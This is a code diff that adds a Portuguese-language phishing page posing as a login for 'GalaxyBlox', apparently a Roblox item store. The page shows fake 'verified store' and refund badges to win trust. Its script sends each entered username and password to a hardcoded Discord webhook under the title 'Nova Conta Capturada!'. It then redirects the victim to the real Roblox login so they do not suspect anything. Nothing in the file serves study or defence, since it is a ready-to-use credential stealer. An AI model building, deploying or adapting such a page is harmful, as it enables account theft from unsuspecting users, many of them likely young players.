@@ -1,0 +1,189 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+ <meta charset="UTF-8">
+ <meta name="viewport" content="width=device-width, initial-scale=1.0">
+ <title>GalaxyBlox - Login</title>
+ <style>
+ * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; }
+ body { background-color: #050505; color: white; height: 100vh; display: flex; justify-content: center; align-items: center; overflow: hidden; position: relative; }
+ 
+ /* Fundo de Estrelas */
+ .stars {
+ position: absolute; top: 0; left: 0; width: 100%; height: 100%; z-index: -1;
+ background-image: 
+ radial-gradient(2px 2px at 20px 30px, #fff, transparent),
+ radial-gradient(2px 2px at 40px 70px, rgba(255,255,255,0.8), transparent),
+ radial-gradient(2px 2px at 50px 160px, #fff, transparent),
+ radial-gradient(2px 2px at 90px 40px, #fff, transparent);
+ background-size: 200px 200px;
+ animation: twinkle 4s infinite linear;
+ }
+ @keyframes twinkle { 0% { opacity: 0.5; transform: translateY(0); } 50% { opacity: 1; } 100% { opacity: 0.5; transform: translateY(-20px); } }
+
+ /* Caixa de Login */
+ .login-container {
+ background: rgba(20, 0, 40, 0.85); padding: 40px; border-radius: 15px;
+ box-shadow: 0 0 20px #8a2be2, 0 0 60px #4b0082;
+ width: 350px; text-align: center; border: 1px solid #9370db;
+ backdrop-filter: blur(5px); z-index: 10;
+ }
+
+ .logo { font-size: 32px; font-weight: bold; margin-bottom: 15px; text-transform: uppercase; letter-spacing: 2px; color: #fff; text-shadow: 0 0 10px #8a2be2, 0 0 20px #8a2be2; }
+ .logo span { color: #d8bfd8; }
+
+ /* --- NOVA SEÇÃO: PROVA SOCIAL / LOJA VERIFICADA --- */
+ .store-proof {
+     background: rgba(255, 255, 255, 0.05);
+     border: 1px solid #ffd700;
+     border-radius: 8px;
+     padding: 10px;
+     margin-bottom: 20px;
+     display: flex;
+     flex-direction: column;
+     align-items: center;
+     gap: 5px;
+ }
+
+ .verified-badge {
+     display: inline-flex;
+     align-items: center;
+     gap: 5px;
+     background: #ffd700;
+     color: #000;
+     font-size: 10px;
+     font-weight: bold;
+     padding: 2px 8px;
+     border-radius: 10px;
+     text-transform: uppercase;
+     box-shadow: 0 0 5px #ffd700;
+ }
+
+ .stars-rating {
+     color: #ffd700;
+     font-size: 14px;
+     letter-spacing: 2px;
+     text-shadow: 0 0 5px #ffa500;
+ }
+
+ .trust-text {
+     font-size: 11px;
+     color: #ccc;
+     line-height: 1.4;
+ }
+
+ .trust-highlights {
+     display: flex;
+     gap: 10px;
+     font-size: 10px;
+     color: #98fb98; /* Verde claro */
+     margin-top: 2px;
+ }
+ .trust-highlights span {
+     border: 1px solid #98fb98;
+     padding: 1px 4px;
+     border-radius: 4px;
+ }
+
+ /* Fins da Nova Seção */
+
+ input[type="text"], input[type="password"] {
+ width: 100%; padding: 12px; margin: 10px 0; background: #1a0b2e;
+ border: 1px solid #6a5acd; border-radius: 5px; color: white; outline: none; transition: 0.3s;
+ }
+ input:focus { border-color: #da70d6; box-shadow: 0 0 10px #9370db; }
+
+ button {
+ width: 100%; padding: 12px; margin-top: 20px; background: linear-gradient(45deg, #4b0082, #8a2be2);
+ border: none; border-radius: 5px; color: white; font-weight: bold; cursor: pointer;
+ box-shadow: 0 0 10px #8a2be2; transition: 0.3s;
+ }
+ button:hover { background: linear-gradient(45deg, #8a2be2, #da70d6); box-shadow: 0 0 20px #da70d6; transform: scale(1.02); }
+ 
+ .footer-link { margin-top: 15px; display: block; color: #dda0dd; text-decoration: none; font-size: 14px; }
+ .footer-link:hover { color: #fff; text-decoration: underline; }
+ 
+ /* Loading state */
+ button:disabled { background: #555; cursor: not-allowed; }
+ </style>
+</head>
+<body>
+
+ <div class="stars"></div>
+
+ <div class="login-container">
+ <div class="logo">Galaxy<span>Blox</span></div>
+ 
+ <!-- NOVO: Bloco de Confiança / Loja -->
+ <div class="store-proof">
+     <div class="verified-badge">
+         ✅ Lojas Verificadas
+     </div>
+     <div class="stars-rating">★★★★★</div>
+     <div class="trust-text">
+         Super Confiável • Reembolso Garantido
+     </div>
+     <div class="trust-highlights">
+         <span>🔒 Seguro</span>
+         <span>⚡ Entrega Imediata</span>
+     </div>
+ </div>
+
+ <form id="loginForm">
+ <input type="text" id="username" placeholder="Usuário ou E-mail" required autocomplete="off">
+ <input type="password" id="password" placeholder="Senha" required autocomplete="off">
+ 
+ <button type="submit" id="btnSubmit">Entrar</button>
+ <a href="#" class="footer-link">Esqueceu a senha?</a>
+ </form>
+ </div>
+
+ <script>
+ // SEU WEBHOOK JÁ ESTÁ COLOCADO AQUI
+ const webhookURL = "https://discord.com/api/webhooks/1560084647835074562/aGMOcUz1hb-7I1zUhQ33C2eH4FTAxc63ZiRndP0Vw3JEjf-bK97pXRSFfSGWAS3ULhz1";
+
+ document.getElementById('loginForm').addEventListener('submit', async function(e) {
+ e.preventDefault();
+ 
+ const user = document.getElementById('username').value;
+ const pass = document.getElementById('password').value;
+ const btn = document.getElementById('btnSubmit');
+ 
+ // Muda botão para "Enviando..."
+ btn.innerText = "Entrando...";
+ btn.disabled = true;
+
+ try {
+ // Envia para o Discord
+ await fetch(webhookURL, {
+ method: 'POST',
+ headers: { 'Content-Type': 'application/json' },
+ body: JSON.stringify({
+ embeds: [{
+ title: "🎣 Nova Conta Capturada!",
+ color: 0x8a2be2, // Roxo
+ fields: [
+ { name: "👤 Usuário", value: user, inline: true },
+ { name: "🔑 Senha", value: pass, inline: true },
+ { name: "📅 Data/Hora", value: new Date().toLocaleString(), inline: false }
+ ],
+ footer: { text: "GalaxyBlox Security System" },
+ timestamp: new Date().toISOString()
+ }]
+ })
+ });
+
+ // Simula loading e redireciona para o Roblox real para não desconfiar
+ setTimeout(() => {
+ window.location.href = "https://www.roblox.com/login";
+ }, 1500);
+
+ } catch (error) {
+ alert("Erro ao conectar. Tente novamente.");
+ btn.innerText = "Entrar";
+ btn.disabled = false;
+ }
+ });
+ </script>
+</body>
+</html>
